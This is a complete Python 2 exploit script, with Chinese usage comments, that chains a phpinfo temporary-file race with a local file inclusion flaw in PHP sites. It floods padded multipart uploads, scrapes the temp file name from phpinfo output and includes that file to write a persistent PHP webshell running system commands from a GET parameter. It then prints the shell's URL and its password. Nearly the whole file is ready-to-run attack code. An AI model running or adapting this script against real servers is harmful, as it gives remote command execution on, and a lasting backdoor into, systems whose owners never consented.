#!/usr/bin/env python
# encoding=utf-8

'''

可能需要你改的几个地方：
1、host
2、port
3、request中的phpinfo页面名字及路径
4、hello_lfi() 函数中的url，即存在lfi的页面和参数
5、如果不成功或报错，尝试增加padding长度到7000、8000试试
6、某些开了magic_quotes_gpc或者其他东西不能%00的，自行想办法截断并在（4）的位置对应修改
 Good Luck :)

'''

import re,sys,time
import urllib2
import hashlib
from socket import *
from time import sleep
try:
	host = sys.argv[1]
	#host = gethostbyname(domain)
	port = int(sys.argv[2])
	phpinfopath = '/phpinfo.php'
	lfipath = '/test.php?file='
except Exception as e:
	print "Usage:python %s host port" % sys.argv[0]
	exit(1)

print "[*]host: %s \n[*]port: %s\n[*]phpinfopath: %s\n[*]lfipath: %s" % (host, port, phpinfopath,lfipath)
shell_name = hashlib.md5(host+str(time.time())).hexdigest() + '.php'
pattern = re.compile(r'''\[tmp_name\]\s=&gt;\s(.*)\W*error]''')

payload = '''idwar<?php fputs(fopen('./''' + shell_name + '''\',"w"),"idwar was here<?php @system(\$_GET[awe]);?>")?>\r'''
req = '''-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r''' % payload

padding='A' * 8000
request='''POST {}?a='''.format(phpinfopath)+padding+''' HTTP/1.0\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie='''+padding+'''\r
HTTP_ACCEPT: ''' + padding + '''\r
HTTP_USER_AGENT: ''' + padding + '''\r
HTTP_ACCEPT_LANGUAGE: ''' + padding + '''\r
HTTP_PRAGMA: ''' + padding + '''\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s''' % (len(req), host, req)


def hello_lfi():
    while 1:
        s = socket(AF_INET, SOCK_STREAM)
        s.connect((host, port))
        s.send(request)
        data = ''
        while r'</body></html>' not in data:
            data = s.recv(9999)
            search_ = re.search(pattern, data)
            if search_:
                tmp_file_name = search_.group(1)
                url = "http://%(host)s:%(port)s%(lfipath)s%(tmp_file_name)s" % {'tmp_file_name':tmp_file_name, 'host':host, 'port':port, 'lfipath':lfipath}
                print url
                search_request = urllib2.Request(url)
                search_response = urllib2.urlopen(search_request)
                html_data = search_response.read()
                if 'idwar' in html_data:
                    s.close()
                    return '\nDone. Your webshell is : \n\n%s\n' % ('http://' + host + lfipath[:lfipath.rfind('/')+1] + shell_name)
        s.close()

if __name__ == '__main__':
    print hello_lfi()
    print '\n Good Luck :),pass is awe'
